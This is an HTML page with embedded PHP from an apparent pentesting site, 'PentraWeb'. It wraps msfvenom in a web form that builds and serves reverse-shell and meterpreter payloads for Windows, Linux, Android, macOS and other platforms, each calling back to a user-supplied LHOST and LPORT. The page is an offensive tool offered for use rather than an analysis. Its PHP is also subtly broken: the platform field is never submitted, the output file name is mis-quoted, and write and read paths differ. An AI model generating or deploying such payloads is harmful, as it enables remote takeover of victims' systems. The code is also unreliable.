<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MSFVenom Payload Generator</title>
    <link rel="stylesheet" href="../Static/css/homepage.css"> <!-- Link to your main CSS file -->
    <link rel="stylesheet" href="../Static/css/payloads.css"> <!-- Link to the MSFvenom Tool CSS file -->
</head>
<body>
        <!-- Header Section -->
        <header>
        <div class="logo">
            <h1>PentraWeb</h1>
        </div>
        <nav>
            <ul>
                <li><a href="homepage.html" style="color: aquamarine;">Home</a></li>
                <li><a href="scanpage.html">Scan</a></li>
                <li><a href="reportpage.html">Reports</a></li>
                <li><a href="toolspage.html">Tools</a></li>
                <li><a href="bookspage.html">Books</a></li>
                <li><a href="ic_scada.html">IC & SCADA</a></li>
                <li><a href="vulnerable_systems.html">Vulnerable Systems</a></li>
                <li><a href="online_resources.html">Online Resources</a></li>
                <li><a href="aboutpage.html">About</a></li>
                <li><a href="loginpage.html">Login</a></li>
            </ul>
        </nav>
    </header>


    <h1>MSFVenom Payload Generator</h1>
    <form method="POST">
        <label for="lhost">LHOST:</label>
        <input type="text" id="lhost" name="lhost" required><br><br>
        
        <label for="lport">LPORT:</label>
        <input type="text" id="lport" name="lport" required><br><br>
        
        <label for="payload_type">Payload Type:</label>
        <select id="payload_type" name="payload_type" required>
            <option value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</option>
            <option value="windows/meterpreter/reverse_http">windows/meterpreter/reverse_http</option>
            <option value="windows/meterpreter/reverse_https">windows/meterpreter/reverse_https</option>
            <option value="linux/x86/shell_reverse_tcp">linux/x86/shell_reverse_tcp</option>
            <option value="linux/x64/meterpreter_reverse_tcp">linux/x64/meterpreter_reverse_tcp</option>
            <option value="android/meterpreter/reverse_tcp">android/meterpreter/reverse_tcp</option>
            <option value="osx/x86/shell_reverse_tcp">osx/x86/shell_reverse_tcp</option>
            <option value="php/meterpreter/reverse_tcp">php/meterpreter/reverse_tcp</option>
            <option value="python/meterpreter/reverse_tcp">python/meterpreter/reverse_tcp</option>
            <option value="java/meterpreter/reverse_tcp">java/meterpreter/reverse_tcp</option>   
            <!-- Add more payload types as needed -->
        </select><br><br>
        
        <label for="output_format">Output Format:</label>
        <select id="output_format" name="output_format" required>
                <option value="exe">.exe</option>
                <option value="elf">.elf</option>
                <option value="raw">.raw</option>
                <option value="py">.py</option>
                <option value="apk">.apk</option>
                <option value="bat">.bat</option>
                <option value="jsp">.jsp</option>
                <option value="war">.war</option>
                <option value="ps1">.ps1</option>   <!-- Add more formats as needed -->
        </select><br><br>
        <select id="platform">
                        <option value="windows">Windows</option>
                        <option value="linux">Linux</option>
                        <option value="android">Android</option>
                        <option value="osx">Mac OS</option>
                        <option value="php">PHP</option>
                        <option value="java">Java</option>
                        <option value="python">Python</option>
                    </select><br><br>       
        <button type="submit" name="generate">Generate and Download Payload</button>
    </form>

    <footer>
        <div class="contact-info">
            <p>Contact Information</p>
            <p>Email: support@pentraweb.com</p>
        </div>
        <div class="legal">
            <a href="privacy-policy.html">Privacy Policy</a>
            <a href="terms-of-use.html">Terms of Use</a>
        </div>
    </footer>

    <?php
    if (isset($_POST['generate'])) {
        putenv('HOME=/var/www');
        $lhost = escapeshellarg($_POST['lhost']);
        $lport = escapeshellarg($_POST['lport']);
        $payload_type = escapeshellarg($_POST['payload_type']);
        $output_format = escapeshellarg($_POST['output_format']);
        $platform = escapeshellarg($_POST['platform']);
        

        // Define the output file name
        $output_file = "payload." . $output_format;

        // Build the msfvenom command
        $command = "msfvenom -p $payload_type --platform $platform LHOST=$lhost LPORT=$lport -f $output_format -o /var/www/html/$output_file 2>&1";

        // Execute the command
        exec($command, $output, $return_var);

        if ($return_var === 0) {
            // Provide the file for download
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($output_file) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($output_file));
            readfile($output_file);

            // Delete the file after download
            unlink($output_file);
            exit;
        } else {
            echo "<p style='color: red;'>Error generating payload. Please check your inputs and try again.</p>";
            echo "<pre>" . implode("\n", $output) . "</pre>";
        }
    }
    ?>
</body>
</html>
